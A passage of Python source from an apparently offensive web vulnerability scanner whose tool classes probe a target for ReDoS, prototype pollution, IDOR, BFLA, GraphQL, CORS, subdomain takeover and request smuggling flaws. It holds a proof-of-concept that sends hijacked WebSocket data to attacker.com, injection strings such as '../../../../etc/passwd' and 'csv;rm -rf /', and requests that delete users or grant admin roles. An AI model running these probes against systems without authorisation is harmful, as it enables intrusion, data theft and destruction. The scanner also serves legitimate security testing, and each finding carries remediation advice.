                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                if '"keys"' in body or '"kty"' in body or "issuer" in body:
                    has_alg_none = '"alg":"none"' in body or '"alg": "none"' in body
                    profile.findings.append(Finding(
                        id="JWKS-EXPOSED",
                        title=f"JWKS/OpenID configuration exposed at {path}",
                        severity="INFO" if not has_alg_none else "HIGH",
                        cvss=0.0 if not has_alg_none else 8.8,
                        cwe="CWE-522",
                        description=f"JWKS endpoint {url} is publicly accessible. Keys: {body[:100]}{'  *** alg:none found!' if has_alg_none else ''}",
                        poc_curl=f"curl -sk {url} | python3 -m json.tool",
                        category="Authentication",
                        remediation="Restrict JWKS endpoint to internal networks. Verify jku/x5u headers against a pinned allowlist before fetching keys."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 86: Regex DoS (ReDoS) Probe (SKILL-96) ───────────────
class ReDoSProbe:
    """Send ReDoS payloads to detect catastrophic backtracking in input validation."""
    NAME = "ReDoS Probe"
    REDOS_PAYLOADS = [
        "a" * 30 + "!",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        "((((((((((((((((((((a" * 2,
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab",
        "1" * 50 + "@" + "a" * 50 + ".com",
    ]
    PARAMS = ["email", "username", "search", "q", "query", "name", "phone", "zip"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.PARAMS[:4]:
            for pl in self.REDOS_PAYLOADS[:3]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                import time as _time
                t0 = _time.time()
                try:
                    r = _fetch(url, cfg.ua, 10)
                    elapsed = _time.time() - t0
                    if elapsed > 4.0 and r and r.status == 200:
                        profile.findings.append(Finding(
                            id="REDOS-DETECT",
                            title=f"Potential ReDoS in parameter '{param}' ({elapsed:.1f}s response)",
                            severity="MEDIUM",
                            cvss=5.9,
                            cwe="CWE-1333",
                            description=f"Request with crafted input to '{param}' took {elapsed:.1f}s — may indicate catastrophic regex backtracking.",
                            poc_curl=f"time curl -sk '{url}'",
                            category="DoS",
                            remediation="Replace backtracking-vulnerable regex with possessive quantifiers, atomic groups, or linear-time parsers."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 87: Dangling DNS / Subdomain Takeover v2 (SKILL-97) ──
class SubdomainTakeoverV2:
    """Extended subdomain takeover checks including CNAME chain analysis."""
    NAME = "Subdomain Takeover V2"
    EXTENDED_FINGERPRINTS = {
        "There isn't a GitHub Pages site here": ("GitHub Pages", "CRITICAL"),
        "Repository not found": ("GitHub", "CRITICAL"),
        "The requested URL was not found on this server": ("Apache/generic", "LOW"),
        "NoSuchBucket": ("AWS S3", "CRITICAL"),
        "fastly error: unknown domain": ("Fastly", "HIGH"),
        "Squarespace 404": ("Squarespace", "HIGH"),
        "Sorry, we could not find the page": ("Webflow", "HIGH"),
        "Project not found": ("GitLab Pages", "CRITICAL"),
        "This domain isn't connected": ("Shopify", "HIGH"),
        "Do you want to register": ("Namecheap parking", "HIGH"),
        "The feed has not been found": ("Tumblr", "MEDIUM"),
        "azure websites": ("Azure Web Apps", "HIGH"),
        "404 Not Found": ("generic-404", "LOW"),
        "domain is not configured": ("Pantheon", "HIGH"),
        "Help Center Closed": ("Zendesk", "HIGH"),
        "is not a registered InCloud YouTrack": ("JetBrains YouTrack", "HIGH"),
    }
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import socket
        for sub in ["www", "blog", "help", "support", "dev", "staging",
                    "api", "beta", "test", "mail", "cdn", "status"][:8]:
            host = f"{sub}.{profile.apex}"
            try:
                socket.getaddrinfo(host, 80)
            except socket.gaierror:
                profile.findings.append(Finding(
                    id=f"DANGLE-DNS-{sub.upper()}",
                    title=f"Dangling DNS — {host} does not resolve",
                    severity="MEDIUM",
                    cvss=5.4,
                    cwe="CWE-350",
                    description=f"Subdomain {host} has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.",
                    poc_curl=f"dig {host} +short",
                    category="Subdomain Takeover",
                    remediation="Remove stale DNS records. Audit all CNAME targets for unclaimed services."
                ))
                continue
            try:
                r = _fetch(f"https://{host}", cfg.ua, 8)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                for fp, (provider, sev) in self.EXTENDED_FINGERPRINTS.items():
                    if fp.lower() in body.lower():
                        profile.findings.append(Finding(
                            id=f"TAKEOVER-V2-{sub.upper()}",
                            title=f"Subdomain takeover candidate: {host} ({provider})",
                            severity=sev,
                            cvss=8.1 if sev == "CRITICAL" else 6.4,
                            cwe="CWE-350",
                            description=f"https://{host} shows '{fp[:60]}' — matches {provider} unclaimed fingerprint.",
                            poc_curl=f"curl -sk https://{host} | grep -i '{fp[:30]}'",
                            category="Subdomain Takeover",
                            remediation=f"Claim or remove the {provider} service associated with this subdomain."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 88: HTTP/2 Rapid Reset Detection (SKILL-98) ──────────
class HTTP2RapidReset:
    """Detect HTTP/2 support and flag CVE-2023-44487 rapid reset risk."""
    NAME = "HTTP/2 Rapid Reset"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        try:
            import subprocess
            result = subprocess.run(
                ["curl", "-sk", "--http2", "-I", "-w", "%{http_version}", "-o", "/dev/null",
                 profile.url],
                capture_output=True, text=True, timeout=10)
            if "2" in result.stdout:
                profile.findings.append(Finding(
                    id="HTTP2-RAPID-RESET",
                    title="HTTP/2 enabled — assess CVE-2023-44487 (Rapid Reset) exposure",
                    severity="MEDIUM",
                    cvss=7.5,
                    cwe="CWE-400",
                    description="Server supports HTTP/2. Verify it is patched against CVE-2023-44487 (HTTP/2 Rapid Reset DoS). Vulnerable servers can be overwhelmed by RST_STREAM flood.",
                    poc_curl=f"curl -sk --http2 -I {profile.url}",
                    category="DoS",
                    remediation="Update HTTP server to a patched version. Apply h2 connection rate limits. Consider h2c → h1 downgrade for untrusted clients."
                ))
        except Exception:
            pass
        return profile

# ── Tool 89: WebSocket Cross-Site Hijacking (SKILL-99) ────────
class WebSocketHijacking:
    """Detect WebSocket endpoints vulnerable to Cross-Site WebSocket Hijacking."""
    NAME = "WebSocket CSWSH"
    WS_PATHS = ["/ws", "/websocket", "/socket", "/live",
                "/realtime", "/api/ws", "/api/socket",
                "/sockjs/info", "/socket.io/"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.WS_PATHS:
            url = profile.url.rstrip("/") + path
            ws_url = url.replace("https://", "wss://").replace("http://", "ws://")
            try:
                r = _fetch(url, cfg.ua, cfg.timeout,
                           headers_extra={
                               "Upgrade": "websocket",
                               "Connection": "Upgrade",
                               "Sec-WebSocket-Version": "13",
                               "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                               "Origin": "https://evil.example.com"
                           })
                if r and r.status in (101, 200):
                    profile.findings.append(Finding(
                        id="CSWSH-WS",
                        title=f"WebSocket endpoint may be vulnerable to CSWSH: {path}",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-346",
                        description=f"WebSocket upgrade at {path} responded {r.status} to a request with evil.example.com Origin header. If no Origin validation, CSWSH is possible.",
                        poc_curl=(
                            f"# Attacker page:\n"
                            f"var ws = new WebSocket('{ws_url}');\n"
                            f"ws.onmessage = e => fetch('https://attacker.com/?d='+btoa(e.data));"
                        ),
                        category="WebSocket",
                        remediation="Validate WebSocket Origin header against same-site allowlist. Require CSRF token in first WebSocket message."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 90: Prototype Pollution Advanced (SKILL-100) ─────────
class PrototypePollutionAdvanced:
    """Advanced prototype pollution via query string, JSON body, and URL-encoded body."""
    NAME = "Prototype Pollution Advanced"
    PP_PAYLOADS_QS = [
        "__proto__[polluted]=apexhunter",
        "constructor[prototype][polluted]=apexhunter",
        "__proto__.polluted=apexhunter",
        "a[__proto__][polluted]=apexhunter",
    ]
    PP_PAYLOADS_JSON = [
        {"__proto__": {"polluted": "apexhunter"}},
        {"constructor": {"prototype": {"polluted": "apexhunter"}}},
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api", "/api/v1", "/api/v2", "/api/search", "/api/query"]
        for path in api_paths[:3]:
            base = profile.url.rstrip("/") + path
            # Query string pollution
            for qs in self.PP_PAYLOADS_QS[:2]:
                url = base + "?" + qs
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        if "apexhunter" in body:
                            profile.findings.append(Finding(
                                id="PP-ADVANCED-QS",
                                title="Advanced prototype pollution via query string",
                                severity="HIGH",
                                cvss=7.3,
                                cwe="CWE-1321",
                                description=f"Query string {qs} caused 'apexhunter' to appear in response body at {url[:80]}.",
                                poc_curl=f"curl -sk '{url}'",
                                category="Injection",
                                remediation="Freeze Object.prototype. Use Object.create(null) for config objects. Sanitize keys before merge."
                            ))
                            return profile
                except Exception:
                    pass
            # JSON body pollution
            for pl in self.PP_PAYLOADS_JSON:
                try:
                    r = _fetch(base, cfg.ua, cfg.timeout, "POST",
                               json.dumps(pl).encode(),
                               {"Content-Type": "application/json"})
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        if "apexhunter" in body:
                            profile.findings.append(Finding(
                                id="PP-ADVANCED-JSON",
                                title="Advanced prototype pollution via JSON body",
                                severity="HIGH",
                                cvss=7.3,
                                cwe="CWE-1321",
                                description=f"JSON payload {json.dumps(pl)[:80]} caused pollution reflection at {base}.",
                                poc_curl=f"curl -sk -X POST {base} -H 'Content-Type: application/json' -d '{json.dumps(pl)}'",
                                category="Injection",
                                remediation="Freeze Object.prototype. Use structured clone or safe merge libraries. Block __proto__ keys in JSON parsers."
                            ))
                            return profile
                except Exception:
                    pass
        return profile

# ── Tool 91: HTTP Parameter Tampering Advanced (SKILL-101) ────
class HPPAdvanced:
    """Test HTTP Parameter Pollution across REST, multipart, and array notation."""
    NAME = "HPP Advanced"
    HPP_TESTS = [
        ("?id=1&id=2", "duplicate"),
        ("?ids[]=1&ids[]=2", "array_notation"),
        ("?id[0]=1&id[1]=2", "indexed_array"),
        ("?search=a%00b", "null_byte"),
        ("?filter=normal&filter=admin", "filter_override"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api/users", "/api/items", "/api/products", "/api/v1/users"]
        for path in api_paths[:3]:
            base = profile.url.rstrip("/") + path
            for qs, label in self.HPP_TESTS[:4]:
                url = base + qs
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    baseline = _fetch(base + "?id=1", cfg.ua, cfg.timeout)
                    if not baseline:
                        continue
                    if r.status == 200 and r.status != baseline.status:
                        profile.findings.append(Finding(
                            id=f"HPP-{label.upper()}",
                            title=f"HTTP Parameter Pollution ({label}) on {path}",
                            severity="MEDIUM",
                            cvss=5.4,
                            cwe="CWE-235",
                            description=f"Parameter pollution variant '{label}' at {url[:80]} returned {r.status} vs baseline {baseline.status}.",
                            poc_curl=f"curl -sk '{url}'",
                            category="Injection",
                            remediation="Define explicit parsing behavior for duplicate parameters. Reject or take-first/take-last consistently."
                        ))
                except Exception:
                    pass
        return profile

# ── Tool 92: Insecure Direct Object Reference v2 (SKILL-102) ──
class IDORv2:
    """Second-order IDOR via object references in response bodies."""
    NAME = "IDOR v2"
    ID_JSON = re.compile(
        r'"(?:id|user_id|account_id|order_id|doc_id|file_id|uid|uuid)"'
        r'\s*:\s*(?:"([a-zA-Z0-9\-]{4,40})"|(\\d{1,10}))', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api/me", "/api/user", "/api/profile",
                     "/api/account", "/api/v1/me"]
        for path in api_paths[:3]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or not r.body:
                    continue
                body = r.body.decode("utf-8", errors="replace")
                for m in self.ID_JSON.finditer(body):
                    obj_id = m.group(1) or m.group(2)
                    if not obj_id:
                        continue
                    # Try accessing the object directly
                    guess = profile.url.rstrip("/") + path + "/" + obj_id
                    r2 = _fetch(guess, cfg.ua, cfg.timeout)
                    if r2 and r2.status == 200:
                        profile.findings.append(Finding(
                            id="IDOR-V2-OBJECT",
                            title=f"Second-order IDOR — object ID {obj_id[:20]} directly accessible",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-639",
                            description=f"ID '{obj_id}' found in {path} response. Direct access via {guess[:80]} returns 200 without auth context verification.",
                            poc_curl=f"curl -sk '{guess}'",
                            category="Access Control",
                            remediation="Implement object-level authorization on every endpoint. Use opaque references + server-side ownership checks."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 93: Forced Browsing / Unlinked Pages (SKILL-103) ─────
class ForcedBrowsing:
    """Discover unlinked admin/backup/config pages via targeted brute-force."""
    NAME = "Forced Browsing"
    PATHS = [
        "/admin.php", "/admin.html", "/admin/login", "/administrator",
        "/wp-admin", "/wp-login.php", "/phpmyadmin", "/pma",
        "/backup", "/backup.zip", "/backup.tar.gz", "/db_backup.sql",
        "/config.php", "/config.bak", "/web.config", "/app.config",
        "/.git/HEAD", "/.svn/entries", "/.env.bak", "/.env.backup",
        "/server-status", "/server-info", "/nginx_status", "/status.php",
        "/install.php", "/setup.php", "/upgrade.php", "/update.php",
        "/test.php", "/info.php", "/phpinfo.php", "/debug.php",
        "/cgi-bin/test.cgi", "/cgi-bin/printenv", "/cgi-bin/env",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status not in (200, 403):
                    continue
                body_s = (r.body or b"").decode("utf-8", errors="replace")
                sev = "HIGH" if r.status == 200 else "MEDIUM"
                is_interesting = any(k in body_s.lower() for k in [
                    "phpinfo", "database", "password", "config", "backup",
                    "ref:", "HEAD", "svn", "admin", "root"]) or r.status == 200
                if is_interesting:
                    profile.findings.append(Finding(
                        id=f"FORCED-BROWSE-{path.replace('/', '_')[:20].upper()}",
                        title=f"Unlinked page accessible: {path}",
                        severity=sev,
                        cvss=6.5 if sev == "HIGH" else 4.3,
                        cwe="CWE-425",
                        description=f"Direct request to {url} returned HTTP {r.status}. Content preview: {body_s[:80]}",
                        poc_curl=f"curl -sk {url}",
                        category="Information Disclosure",
                        remediation="Remove backup/debug/install files from production. Add authentication to admin paths. Return 404 (not 403) for hidden resources."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 94: Sensitive Data in API Responses (SKILL-104) ──────
class SensitiveDataExposure:
    """Scan API responses for PII, credentials, keys, and internal IPs."""
    NAME = "Sensitive Data Exposure"
    PII_PATTERNS = [
        (re.compile(r'\b[A-Z]{2,3}\d{6,10}\b'), "Passport/ID number"),
        (re.compile(r'\b\d{4}[-\s]\d{4}[-\s]\d{4}[-\s]\d{4}\b'), "Credit card pattern"),
        (re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b'), "Credit card number"),
        (re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'), "Email address"),
        (re.compile(r'\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d+\.\d+\b'), "RFC1918 internal IP"),
        (re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*[^\s\'"&]{4,}', re.I), "Plaintext password"),
        (re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----'), "Private key"),
        (re.compile(r'(?:AKIA|ASIA|AROA|AIPA|ANPA|ANVA|AIDA)[A-Z0-9]{16}'), "AWS Access Key"),
    ]
    API_PATHS = ["/api/users", "/api/user", "/api/me", "/api/profile",
                 "/api/account", "/api/admin/users", "/api/v1/users",
                 "/api/orders", "/api/payments", "/api/transactions"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.API_PATHS[:6]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or not r.body or r.status not in (200,):
                    continue
                body = r.body.decode("utf-8", errors="replace")
                for pat, label in self.PII_PATTERNS:
                    m = pat.search(body)
                    if m:
                        val = m.group(0)[:30]
                        profile.findings.append(Finding(
                            id=f"PII-EXPOSE-{label.replace(' ', '_').upper()[:15]}",
                            title=f"Sensitive data in API response: {label}",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-359",
                            description=f"{label} found in {path} response. Sample: {val}... Unauthenticated endpoint exposes PII.",
                            poc_curl=f"curl -sk {url} | python3 -m json.tool | grep -iE 'email|password|card|key'",
                            category="Data Exposure",
                            remediation="Apply field-level response filtering. Remove PII from unauthenticated endpoints. Encrypt sensitive fields at rest."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 95: Broken Function-Level Authorization (SKILL-105) ──
class BFLAScanner:
    """Test Broken Function Level Authorization — access privileged functions without admin role."""
    NAME = "BFLA Scanner"
    ADMIN_FUNCS = [
        ("DELETE", "/api/users/1"),
        ("DELETE", "/api/admin/users/1"),
        ("PUT", "/api/users/1/role"),
        ("PATCH", "/api/users/1"),
        ("POST", "/api/admin/users"),
        ("GET", "/api/admin/users"),
        ("GET", "/api/admin/logs"),
        ("GET", "/api/admin/config"),
        ("DELETE", "/api/items/1"),
        ("PUT", "/api/admin/settings"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for method, path in self.ADMIN_FUNCS[:8]:
            url = profile.url.rstrip("/") + path
            try:
                payload = b'{"role":"user"}' if method in ("PUT","PATCH","POST") else None
                headers = {"Content-Type": "application/json"} if payload else {}
                r = _fetch(url, cfg.ua, cfg.timeout, method, payload, headers)
                if r and r.status not in (401, 403, 404, 405):
                    profile.findings.append(Finding(
                        id=f"BFLA-{method}-{path.replace('/','_')[:15].upper()}",
                        title=f"BFLA — {method} {path} accessible without admin role",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-285",
                        description=f"{method} {path} returned HTTP {r.status} for unauthenticated/low-privilege request. Privileged function may be exposed.",
                        poc_curl=f"curl -sk -X {method} {url}" + (f" -d '{payload.decode()}'" if payload else ""),
                        category="Access Control",
                        remediation="Enforce function-level authorization checks on every endpoint. Validate role/permission server-side for every request."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 96: GraphQL Mutation Fuzzer (SKILL-106) ─────────────
class GraphQLMutationFuzzer:
    """Fuzz GraphQL mutations for mass create, privilege escalation, and injection."""
    NAME = "GraphQL Mutation Fuzzer"
    MUTATIONS = [
        '{"query":"mutation{createUser(input:{username:\\"admin\\",password:\\"pass123\\",role:\\"admin\\"}){id}}"}',
        '{"query":"mutation{updateUser(id:1,input:{role:\\"admin\\"}){id role}}"}',
        '{"query":"mutation{deleteUser(id:1){success}}"}',
        '{"query":"mutation{__typename}"}',
    ]
    GQL_PATHS = ["/graphql", "/api/graphql", "/gql", "/query"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for ep in self.GQL_PATHS:
            url = profile.url.rstrip("/") + ep
            for mutation in self.MUTATIONS:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               mutation.encode(),
                               {"Content-Type": "application/json"})
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    if "errors" not in body and ('"id"' in body or '"success"' in body):
                        m_label = mutation[10:50].replace('"','').replace('\\','')
                        profile.findings.append(Finding(
                            id="GQL-MUTATION-FUZZ",
                            title=f"GraphQL mutation succeeded without authorization: {m_label[:40]}",
                            severity="CRITICAL",
                            cvss=9.1,
                            cwe="CWE-285",
                            description=f"GraphQL mutation at {ep} succeeded with data: {body[:100]}",
                            poc_curl=f"curl -sk -X POST {url} -H 'Content-Type: application/json' -d '{mutation}'",
                            category="GraphQL",
                            remediation="Enforce authentication and authorization checks on all GraphQL mutations. Use persisted queries in production."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 97: Insecure CORS on API (SKILL-107) ─────────────────
class InsecureCORSOnAPI:
    """Detect API endpoints that reflect arbitrary Origin with CORS allow."""
    NAME = "Insecure CORS on API"
    EVIL_ORIGINS = [
        "https://evil.example.com",
        "null",
        "https://trusteddomain.com.evil.com",
        "http://localhost",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api", "/api/v1", "/api/v2", "/api/me",
                     "/api/user", "/api/profile", "/api/data"]
        for path in api_paths[:5]:
            url = profile.url.rstrip("/") + path
            for origin in self.EVIL_ORIGINS:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout,
                               headers_extra={"Origin": origin})
                    if not r:
                        continue
                    acao = r.headers.get("access-control-allow-origin", "")
                    if acao and (acao == origin or acao == "*"):
                        acac = r.headers.get("access-control-allow-credentials", "")
                        sev = "CRITICAL" if "true" in acac.lower() else "HIGH"
                        profile.findings.append(Finding(
                            id=f"CORS-REFLECT-API",
                            title=f"API reflects arbitrary Origin in ACAO header: {path}",
                            severity=sev,
                            cvss=9.0 if sev == "CRITICAL" else 7.4,
                            cwe="CWE-942",
                            description=f"Sent Origin: {origin} to {path}, got ACAO: {acao}, ACAC: {acac}.",
                            poc_curl=(
                                f"curl -sk {url} -H 'Origin: {origin}' -v 2>&1 | "
                                f"grep -i 'access-control'"
                            ),
                            category="CORS",
                            remediation="Use a strict Origin allowlist. Never reflect the Origin header dynamically. Remove CORS headers from non-public APIs."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 98: SSL Pinning Bypass Hints (SKILL-108) ────────────
class SSLPinningBypassHints:
    """Detect certificate transparency logs, old cert fingerprints, and pinning hints."""
    NAME = "SSL Pinning Bypass Hints"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        try:
            import ssl, socket
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            host = profile.host
            port = 443
            with socket.create_connection((host, port), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    import hashlib
                    sha256 = hashlib.sha256(cert).hexdigest()
                    sha1 = hashlib.sha1(cert).hexdigest()
                    der_cert = ssock.getpeercert()
                    issued_to = der_cert.get("subject", ((("commonName","?"),),))[0][0][1]
                    issuer = str(der_cert.get("issuer","?"))
                    not_after = der_cert.get("notAfter", "?")
                    profile.findings.append(Finding(
                        id="SSL-PIN-HINTS",
                        title=f"SSL certificate fingerprints (for pinning bypass research)",
                        severity="INFO",
                        cvss=0.0,
                        cwe="CWE-295",
                        description=(f"CN={issued_to} | Issuer={issuer[:60]} | Expires={not_after}\n"
                                     f"SHA-256: {sha256}\nSHA-1: {sha1}"),
                        poc_curl=(f"# Add to Frida/objection pinning bypass:\n"
                                  f"# openssl s_client -connect {host}:443 </dev/null 2>/dev/null | "
                                  f"openssl x509 -fingerprint -sha256"),
                        category="TLS",
                        remediation="Implement certificate pinning with backup pins. Rotate pins with 60-day lead time."
                    ))
        except Exception:
            pass
        return profile

# ── Tool 99: GraphQL Field Suggestion Leak (SKILL-109) ────────
class GraphQLFieldSuggestionLeak:
    """Exploit GraphQL field name suggestion to enumerate hidden schema fields."""
    NAME = "GraphQL Field Suggestion Leak"
    GQL_PATHS = ["/graphql", "/api/graphql", "/gql", "/query"]
    TYPOS = [
        '{"query":"{userss{id}}"}',
        '{"query":"{adminUser{id}}"}',
        '{"query":"{User{id}}"}',
        '{"query":"{account{id}}"}',
        '{"query":"{profil{id}}"}',
    ]
    SUGGEST_PAT = re.compile(r'Did you mean[^"]*"([^"]+)"', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for ep in self.GQL_PATHS:
            url = profile.url.rstrip("/") + ep
            suggested = set()
            for typo in self.TYPOS:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               typo.encode(), {"Content-Type": "application/json"})
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    for m in self.SUGGEST_PAT.finditer(body):
                        suggested.add(m.group(1))
                except Exception:
                    pass
            if suggested:
                profile.findings.append(Finding(
                    id="GQL-FIELD-SUGGEST",
                    title=f"GraphQL field suggestion leaks schema: {', '.join(list(suggested)[:5])}",
                    severity="MEDIUM",
                    cvss=5.3,
                    cwe="CWE-209",
                    description=f"GraphQL 'Did you mean?' suggestions exposed hidden field names at {ep}: {suggested}",
                    poc_curl=f"curl -sk -X POST {url} -H 'Content-Type: application/json' -d '{self.TYPOS[0]}'",
                    category="GraphQL",
                    remediation="Disable field suggestion in production GraphQL engines (e.g., Apollo Server: `introspection: false, fieldSuggestions: false`)."
                ))
        return profile

# ── Tool 100: Dependency Confusion v2 (SKILL-110) ────────────
class DependencyConfusionV2:
    """Extended dependency confusion: pypi, rubygems, maven, npm scoped packages."""
    NAME = "Dependency Confusion V2"
    PKG_PATTERNS = {
        "npm_scoped": re.compile(r'"name"\s*:\s*"(@[a-z0-9_-]+/[a-z0-9_-]+)"'),
        "npm_internal": re.compile(r'"(?:dependencies|devDependencies)"\s*:\s*\{([^}]+)\}'),
        "requirements": re.compile(r'^([a-zA-Z0-9_-]+)==', re.M),
        "gemspec": re.compile(r's\.add_(?:runtime|development)_dependency\s+["\']([^"\']+)["\']'),
    }
    PUBLIC_PATHS = ["/package.json", "/package-lock.json", "/yarn.lock",
                    "/requirements.txt", "/Gemfile", "/Gemfile.lock",
                    "/pom.xml", "/build.gradle", "/composer.json",
                    "/setup.py", "/pyproject.toml"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.PUBLIC_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status != 200 or not r.body:
                    continue
                body = r.body.decode("utf-8", errors="replace")
                for ptype, pat in self.PKG_PATTERNS.items():
                    matches = pat.findall(body)
                    if matches:
                        pkgs = [m if isinstance(m, str) else m[:40] for m in matches[:5]]
                        profile.findings.append(Finding(
                            id=f"DEP-CONF-V2-{ptype.upper()}",
                            title=f"Dependency manifest exposed with internal packages: {path}",
                            severity="MEDIUM",
                            cvss=5.9,
                            cwe="CWE-427",
                            description=f"File {url} exposed {ptype} package names: {pkgs}. Test if these exist on public registries.",
                            poc_curl=f"curl -sk {url} | grep -E 'name|depend|require'",
                            category="Supply Chain",
                            remediation="Block access to dependency manifests. Use scope namespacing. Configure private registry with NO public fallback."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 101: Improper Error Handling (SKILL-111) ─────────────
class ImproperErrorHandling:
    """Trigger verbose errors via malformed inputs and type confusion."""
    NAME = "Improper Error Handling"
    ERROR_PROBES = [
        ("?id=", ["' OR 1=1--", "../../../../etc/passwd", "<script>", "${7*7}", "{{7*7}}"]),
        ("?page=", ["-1", "null", "9999999999", "NaN", "undefined"]),
        ("?format=", ["json'", "xml%00", "csv;rm -rf /", "\\x00", "{{7}}"]),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        ERROR_PAT = re.compile(
            r'(?:stack trace|at [\w\.<>]+\(|exception|error in|'
            r'syntax error|undefined method|java\.lang\.|'
            r'microsoft\.visualbasic\.|system\.web\.|traceback)', re.I)
        for param_prefix, payloads in self.ERROR_PROBES:
            for pl in payloads[:3]:
                url = profile.url.rstrip("/") + "/" + param_prefix + pl
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    m = ERROR_PAT.search(body)
                    if m and r.status >= 400:
                        profile.findings.append(Finding(
                            id="ERROR-VERBOSE",
                            title="Verbose error message / stack trace disclosed",
                            severity="MEDIUM",
                            cvss=5.3,
                            cwe="CWE-209",
                            description=f"Input '{pl}' to {param_prefix} triggered verbose error. Snippet: {body[max(0,m.start()-30):m.start()+80]}",
                            poc_curl=f"curl -sk '{url}'",
                            category="Information Disclosure",
                            remediation="Configure generic error pages. Log verbose errors server-side only. Never expose stack traces to clients."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 102: HTTP Desync Frontend-Backend (SKILL-112) ────────
class HTTPDesyncAdvanced:
    """Detect HTTP desync via differential timing between CL and TE handling."""
    NAME = "HTTP Desync Advanced"
    DESYNC_PROBES = [
        # CL.TE: body has Transfer-Encoding chunk after Content-Length
        {
            "method": "POST",
            "headers": {
                "Content-Length": "4",
                "Transfer-Encoding": "chunked",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": b"0\r\n\r\n",
        },
        # TE.CL: multiple TE headers
        {
            "method": "POST",
            "headers": {
                "Content-Length": "6",
                "Transfer-Encoding": "chunked",
                "Transfer-Encoding": "cow",
            },
            "body": b"3\r\nGET\r\n0\r\n\r\n",
        },
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for probe in self.DESYNC_PROBES:
            try:
                r = _fetch(profile.url, cfg.ua, 8,
                           probe["method"], probe["body"],
                           probe["headers"])
                if r and r.status == 200:
                    profile.findings.append(Finding(
                        id="DESYNC-ADVANCED",
                        title="HTTP request desync — server accepted ambiguous CL+TE",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-444",
                        description="Server accepted conflicting Content-Length and Transfer-Encoding headers. Potential HTTP request smuggling (advanced CL.TE/TE.CL variant).",
                        poc_curl=(
                            f"curl -sk -X POST {profile.url} "
                            f"-H 'Content-Length: 4' -H 'Transfer-Encoding: chunked' "
                            f"--data-binary $'0\\r\\n\\r\\n'"
                        ),
                        category="HTTP Smuggling",
